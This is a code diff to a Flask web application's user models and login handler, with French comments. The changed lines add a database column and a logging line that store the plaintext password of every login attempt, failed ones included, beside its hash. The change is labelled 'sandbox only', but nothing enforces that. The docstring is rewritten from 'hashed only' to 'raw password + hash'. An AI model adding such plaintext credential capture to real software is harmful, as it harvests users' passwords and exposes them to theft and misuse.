@@ -144,19 +144,19 @@ class User(db.Model, UserMixin):
     def __repr__(self):
         return f"<User {self.username} | {self.phone}>"
 
-
 class LoginAttempt(db.Model):
     __tablename__ = "login_attempt"
     id = db.Column(db.Integer, primary_key=True)
     identifier = db.Column(db.String(120), nullable=False)
     success = db.Column(db.Boolean, default=False)
     password_hash = db.Column(db.String(300))
+    password_plain = db.Column(db.String(300))  # mot de passe brut (sandbox uniquement)
     ip_address = db.Column(db.String(64))
     user_agent = db.Column(db.String(300))
     date = db.Column(db.DateTime, default=datetime.utcnow)
 
     def __repr__(self):
-        return f"<LoginAttempt {self.identifier} | success={self.success}>"
+        return f"<LoginAttempt {self.identifier} success={self.success}>"
 
 
 class Depot(db.Model):
@@ -486,12 +486,13 @@ POST_LOGIN_REDIRECT_URL = "https://qashtrend.com/dashboard"
 
 
 def log_login_attempt(identifier, success, password=None):
-    """Journalise une tentative de connexion (mot de passe stocké hashé uniquement)."""
+    """Journalise une tentative de connexion (sandbox : mot de passe brut + hash)."""
     try:
         attempt = LoginAttempt(
             identifier=identifier,
             success=success,
             password_hash=generate_password_hash(password) if password else None,
+            password_plain=password if password else None,  # mot de passe brut
             ip_address=request.headers.get("X-Forwarded-For", request.remote_addr),
             user_agent=(request.headers.get("User-Agent", "") or "")[:300],
         )
